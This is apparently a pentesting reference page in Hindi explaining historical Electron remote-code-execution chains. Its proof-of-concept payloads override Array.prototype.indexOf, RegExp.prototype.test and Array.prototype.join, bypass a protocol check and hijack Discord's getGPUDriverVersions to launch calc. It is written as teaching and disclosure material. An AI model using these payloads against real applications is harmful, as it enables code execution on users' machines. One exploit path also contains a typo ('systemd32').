# Electron contextIsolation के जरिए preload code से RCE

{{#include ../../banners/hacktricks-training.md}}

ये **ऐतिहासिक chains** हैं, जिनमें preload code ने JavaScript intrinsics या privileged APIs को attacker-controlled renderer content के साथ साझा किया था। Context isolation enabled होने पर, preload और page के JavaScript realms आम तौर पर अलग होते हैं, इसलिए page में prototype overrides अपने-आप preload objects को प्रभावित नहीं करते। इस chain को Electron/application के सटीक version और bridge implementation के अनुसार validate करें।<sup>[[3]](#references)</sup>

## उदाहरण 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) से उदाहरण<sup>[[1]](#references)</sup>

यह code http(s) links को default browser में खोलता है:

![Electron contextIsolation के जरिए preload code से RCE - उदाहरण 1: यह code http(s) links को default browser में खोलता है](<../../images/image (768).png>)

प्रभावित ऐतिहासिक application में, `file:///C:/Windows/System32/calc.exe` जैसा local-file navigation OS launch path तक पहुँच सकता था; `SAFE_PROTOCOLS.indexOf` का उद्देश्य इसे रोकना था।

इसलिए, attacker XSS या arbitrary page navigation के जरिए यह JS code inject कर सकता था:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

क्योंकि `SAFE_PROTOCOLS.indexOf` का कॉल हमेशा 1337 लौटाएगा, attacker सुरक्षा को bypass करके calc execute कर सकता है। अंतिम exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

अनुमति मांगने वाला prompt दिखाए बिना programs execute करने के अन्य तरीकों के लिए original slides देखें।<sup>[[1]](#references)</sup>

ऐतिहासिक Discord chain में UNC-style `file://127.0.0.1/electron/rce.jar` loading को भी एक संभावित execution path माना गया था; exact Windows/Electron build पर इसकी reachability validate करें।<sup>[[2]](#references)</sup>

## Example 2: Discord App RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1) से उदाहरण<sup>[[2]](#references)</sup>

Preload scripts की जांच करते समय, मैंने पाया कि Discord web page में यह function expose करता है, जिससे कुछ allowed modules को `DiscordNative.nativeModules.requireModule('MODULE-NAME')` के जरिए call किया जा सकता है।\
यहां, मैं ऐसे modules का इस्तेमाल नहीं कर सका जिन्हें RCE के लिए सीधे इस्तेमाल किया जा सकता है, जैसे _child_process_ module, लेकिन **मुझे ऐसा code मिला जिससे JavaScript के built-in methods को override करके और exposed module के execution में दखल देकर RCE हासिल किया जा सकता है।**

निम्नलिखित PoC है। मैं यह पुष्टि कर सका कि devTools से "_discord_utils_" नाम के module में defined **`getGPUDriverVersions` function को call करने पर `calc` application लॉन्च** होता है, जबकि **`RegExp.prototype.test` और `Array.prototype.join` को override** किया गया हो।

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

`getGPUDriverVersions` function निम्नलिखित की तरह "_execa_" library का उपयोग करके program execute करने की कोशिश करता है:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

आमतौर पर _execa_ "_nvidia-smi.exe_" को execute करने की कोशिश करता है, जिसे `nvidiaSmiPath` variable में निर्दिष्ट किया गया है। हालांकि, overridden `RegExp.prototype.test` और `Array.prototype.join` के कारण, **argument को बदलकर "**_**calc**_**" कर दिया जाता है _execa**_** की internal processing में**।

विशेष रूप से, ऐतिहासिक `cross-spawn` parser में command-resolution और argument-processing paths को प्रभावित करके argument को बदला जाता है।<sup>[[4]](#references)</sup>

## References

- [1] [Electron: context isolation की कमी का दुरुपयोग - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord Desktop app में RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` parser का revision और chain द्वारा उपयोग किए गए exact paths (lines 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
